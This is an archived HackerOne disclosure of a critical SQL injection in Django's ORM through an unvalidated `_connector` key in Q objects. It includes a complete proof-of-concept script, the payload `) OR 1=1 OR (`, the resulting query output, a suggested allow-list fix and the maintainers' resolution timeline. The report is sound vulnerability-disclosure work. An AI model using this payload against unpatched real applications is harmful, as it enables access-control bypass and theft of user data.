---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
  - stack/python
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2025-11-06
submitted: 2025-09-12T00:19:20.037Z
bounty_usd: null
votes: 77
cve: []
program: "[[programs/django|Django]]"
reporter: "cyberstan"
source: "https://hackerone.com/reports/3335709"
title: "SQL Injection in Django ORM via Unvalidated `_connector` in Q Objects"
---
# SQL Injection in Django ORM via Unvalidated `_connector` in Q Objects

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 77 | **Program:** Django | **Disclosed:** 2025-11-06

- Report: [https://hackerone.com/reports/3335709](https://hackerone.com/reports/3335709)
- CWE: SQL Injection
- Submitted: 2025-09-12T00:19:20.037Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

A **critical** SQL injection vulnerability exists in the Django ORM's handling of `Q` objects. The internal `WhereNode.as_sql` method uses unsafe string formatting to inject the query connector (e.g., 'AND') into the raw SQL query. An attacker can control this connector value via the `_connector` key when a `Q` object is created using dictionary unpacking (e.g., `Q(**user_input)`). This allows the attacker to inject arbitrary SQL into the `WHERE` clause, completely bypassing the ORM's parameterization safeguards, leading to filter bypass and full data exfiltration from the queried model.

---

### Vulnerability Details

The root cause of the vulnerability is in `django/db/models/sql/where.py` within the `WhereNode.as_sql` method. This method is responsible for joining multiple filter conditions together. The code uses unsafe string formatting to insert the connector:

```python
# Simplified representation of the vulnerable code in WhereNode.as_sql
conn = ' %s ' % self.connector
```

The method does not perform any validation or sanitization on the `self.connector` attribute before embedding it into the query. The framework allows a developer to specify this connector via the `_connector` argument when initializing a `Q` object. A common pattern in applications with complex filtering, such as those with a search API, is to accept a dictionary of filters and unpack it directly. This pattern is highly vulnerable:

```python
# An example of a vulnerable application pattern
filter_dictionary = request.json.get('filters', {{}})
query = Q(**filter_dictionary) # VULNERABLE LINE
results = User.objects.filter(query)
```

If an attacker controls the contents of `filter_dictionary`, they can insert a `_connector` key with a malicious SQL payload. This payload is then injected directly into the query's structure.

---

### POC

1. First create a new django project and the app. Also make sure you add the webapp to the installed apps within settings.py.
```bash
django-admin startproject sqli .
python manage.py startapp webapp
```
```python
# sqli/settings.py

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'webapp',  # <-- Add this
]
```

2. Then create a management/commands folder inside your webapp directory and create two empty __init__.py file in both the management and commands directory.


3. After this create a file called poc.py in the management/commands directory and add this code:

```python
from django.core.management.base import BaseCommand
from django.db.models import Q
from webapp.models import User
from django.db import connection

def process_vulnerable_request(search_dict):
    """
    This function simulates a VULNERABLE part of an application.
    
    It takes a dictionary of filters (as if from a JSON API request)
    and uses unpacking pattern without validating the keys.
    """
    print("--> Entering vulnerable function: Q(**search_dict)")
    # THE VULNERABLE LINE: Unpacking a user-controlled dictionary.
    query = Q(**search_dict)
    return User.objects.filter(query)


class Command(BaseCommand):
    help = "Demonstrates a realistic SQLi PoC via Q object's **kwargs unpacking"

    def handle(self, *args, **options):
        # 1. SETUP
        User.objects.all().delete()
        User.objects.create(username="alice", is_admin=False)
        User.objects.create(username="root", is_admin=True)
        self.stdout.write("Sample users created: 'alice' (non-admin) and 'root' (admin)")
        self.stdout.write("-" * 40)

        # 2. THE MALICIOUS PAYLOAD
        # This dictionary simulates a JSON payload sent by an attacker. It looks
        # like a legitimate filter request, but it includes the malicious key.
        malicious_user_payload = {
            "is_admin": False,
            "username": "nonexistent_user",
            "_connector": ") OR 1=1 OR ("
        }
        self.stdout.write(f"Simulating malicious user payload:\n{malicious_user_payload}")
        self.stdout.write("-" * 40)

        # 3. EXECUTING THE VULNERABLE CODE
        # We pass the attacker's dictionary to the vulnerable function.
        queryset = process_vulnerable_request(malicious_user_payload)
        self.stdout.write("-" * 40)

        # 4. THE PROOF
        compiler = queryset.query.get_compiler(using='default')
        sql, params = compiler.as_sql()
        self.stdout.write(self.style.SQL_KEYWORD("Generated SQL:"))
        self.stdout.write(sql % tuple(f"'{p}'" for p in params))
        self.stdout.write("-" * 40)
        
        # 5. THE IMPACT
        self.stdout.write("Query Results:")
        results = list(queryset)
        for user in results:
            self.stdout.write(f"  - Found user: {user}")
        if any(user.is_admin for user in results):
            self.stdout.write(self.style.SUCCESS("\n SUCCESS: The filter was bypassed via dictionary unpacking! The admin user was returned."))
        else:
            self.stdout.write(self.style.ERROR("\n- FAILED: The injection did not bypass the filter."))

```

4. Then modify models.py to add an example user model.
```python
# models.py

from django.db import models

class User(models.Model):
    username = models.CharField(max_length=100)
    is_admin = models.BooleanField(default=False)

    def __str__(self):
        return f"{self.username} (Admin: {self.is_admin})"
```

5. This is all the code required next simply run the following commands to migrate the database and run the poc.
```bash
python manage.py makemigrations
python manage.py migrate
python manage.py poc

```

6. The ouput of this code will highlight the bug as it allows the sql injection and prints out the users in the table. It will also display the final query highlighting the vulnerability. Example expected ouput can be seen below.
```text

Sample users created: 'alice' (non-admin) and 'root' (admin)
----------------------------------------
Simulating malicious user payload:
{'is_admin': False, 'username': 'nonexistent_user', '_connector': ') OR 1=1 OR ('}
----------------------------------------
--> Entering vulnerable function: Q(**search_dict)
----------------------------------------
Generated SQL:
SELECT "webapp_user"."id", "webapp_user"."username", "webapp_user"."is_admin" FROM "webapp_user" WHERE (NOT "webapp_user"."is_admin" ) OR 1=1 OR ( "webapp_user"."username" = 'nonexistent_user')
----------------------------------------
Query Results:
  - Found user: alice (Admin: False)
  - Found user: root (Admin: True)

 SUCCESS: The filter was bypassed via dictionary unpacking! The admin user was returned.
```

---

### Suggested Remediation

The root cause is the trust placed in the `_connector` string. The vulnerability can be patched by validating the connector value against a strict allow-list before it is used for string formatting.

**Proposed Patch (`django/db/models/sql/where.py`):**
```python
# In WhereNode.as_sql method...

def as_sql(self, compiler, connection):
    # Add this validation at the beginning of the method
    if self.connector not in ('AND', 'OR'):
        raise ValueError(
            f"Invalid connector '{{self.connector}}'. Must be 'AND' or 'OR'."
        )
    
    # ... (rest of the method proceeds as normal)
    conn = ' %s ' % self.connector
    # ...
```

## Impact

### Impact

The impact of this vulnerability is **critical**. An attacker who can control the keys of a dictionary used to filter a model can:
-   **Bypass Access Controls:** Retrieve any and all records from the queried table by injecting a condition that is always true (e.g., `OR 1=1`), thereby bypassing all other filters in the `WHERE` clause.
-   **Exfiltrate Sensitive Data:** An attacker can leak the data of all users, including administrators, from a users table. This applies to any model exposed via a vulnerable filter.
-   **Degrade Performance:** A complex injected SQL payload could potentially be used to cause a Denial-of-Service condition by overloading the database.

## Timeline

- **Report Filed**
- **2025-09-17** @jacobtylerwalls: Hello,
Thank you for your report. We will investigate and get back to you soon. In the meantime, please keep this information confidential.
If you haven't already, please review how the Django security team evaluates reports: ​https://docs.djangoproject.com/en/dev/internals/security/.
Note that it can take several weeks before we have completed our analysis. There is no need to chase the security team unless you discover new, relevant information. All reports aim to be resolved within the industry-standard 90 days.
Kind regards, the Django Security Team.
- **Report Triaged**
- **2025-09-30** @jacobtylerwalls: Thanks for this report. The security team is still finalizing its evaluation.
Best,
Jacob
- **2025-10-14** @jacobtylerwalls: Hello cyberstan,

Thank you for your report and patience. We have confirmed the vulnerability and will request a CVE.

I have attached our proposed mitigation solution. Could you please test the patch to ensure it reliably fixes the issue?

We plan to mention the discoverer of the vulnerability in a blog post. Is "cyberstan" okay, or would you prefer to be credited differently?

The Django release with this fix is currently planned for November 5. Please keep this private until after the updated versions are published.

Thank you again!
Django Security Team
- **2025-10-14** @cyberstan: Hi Django  Team,

Thank you for the update and the patches.

I have applied the three patches to a clean checkout of the main branch and can confirm that they successfully prevent the vulnerability and now correctly raises a ValueError and prevents the SQL injection.

Regarding crediting, "cyberstan" is perfectly fine.

Thank you again for the quick and professional handling of this report.

Best regards,
Stan
- **Report Resolved**
- **2025-11-06** @cyberstan: Can we disclose this?
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Not Eligible For Bounty**
